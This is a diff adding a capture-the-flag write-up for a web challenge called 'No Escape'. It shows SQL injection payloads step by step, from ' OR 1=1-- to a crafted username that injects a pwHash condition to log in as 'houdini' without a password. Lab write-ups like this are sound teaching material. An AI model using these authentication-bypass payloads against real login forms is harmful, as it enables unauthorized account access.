@@ -1,0 +1,76 @@
+## [60] No Escape (Web Security)
+
+### Prompt:
+Since in-person events are currently banned, some magician we've never heard of is trying to sell us on the idea of a "digital" magic show where the magician logs in using an impossible password. For added assurances, one lucky audience member is able to login and see the hash of the password as proof the password is impossible. We're willing to bet the secret to this magic trick is not all that complicated. http://challenge.acictf.com:28896. (NOTE: Your port may be different)
+
+### Initial Analysis:
+Visiting http://challenge.acictf.com:28896 directs us to a login page.
+
+------------------LOGIN PAGE-------------------
+No Escape
+
+Houdini was famous for getting out of things without a key. Now a clever Internet magician has devised their latest trick of logging into a website without a valid password...
+Username: 	
+Password: 
+[Login button]	
+------------------LOGIN PAGE-------------------
+
+It looks like we'll have some fun with SQLi and hashes!
+
+### Solution:
+Sure enough, if we type `' OR 1=1-- ` into both the Username and Password fields, we get the admin page - but that's not the end.
+
+------------------ADMIN PAGE-------------------
+No Escape
+[Logout button]
+Welcome admin! The "hash" for account 'houdini' is 'Not a hash'.
+------------------ADMIN PAGE-------------------
+
+So, we should navigate back to the login page and investigate the 'houdini' account.
+
+When we type in
+
+Username: `houdini`
+Password: `' OR 1=1-- `
+
+we get the error message "Login failed!"
+
+So, let's try avoiding password altogether:
+
+Username: `houdini' OR 1=1-- `
+Password: `blahblahblah`
+
+This throws us back into the admin account, so we'll have to get more creative.  Since this SQL Query most likely follows the structure `SELECT username FROM users WHERE username=foo and password=bar`, we can manipulate the structure by getting ahead of the structure:
+
+Username: `houdini' and password='' or 1=1-- `
+Password: `blah`
+
+First success ~~~ the page threw back this error!
+
+------------------LOGIN PAGE-------------------
+No Escape
+
+Houdini was famous for getting out of things without a key. Now a clever Internet magician has devised their latest trick of logging into a website without a valid password...
+Username: 	
+Password: 	
+[Login button]
+Login failed!
+
+Oops! It looks like the following query caused an error...
+`SELECT username FROM users WHERE username = 'houdini' and password='' or 1=1-- ' AND pwHash = '8b7df143d91c716ecfa5fc1730022f6b421b05cedee8fd52b1fc65a96030ad52'`
+------------------LOGIN PAGE-------------------
+
+Nice!  We've confirmed the structure and found out where (and how) to put "Not a hash".  The validation is only Username and pwHash in the query, so let's type in
+
+Username: `houdini' AND pwHash='Not a hash'-- `
+Password: `doesntmatter`
+
+We get the flag when we click Login!
+
+------------------FLAG  PAGE-------------------
+No Escape
+
+Welcome Houdini, here's your flag: ACI{redacted}
+------------------FLAG  PAGE-------------------
+
+END
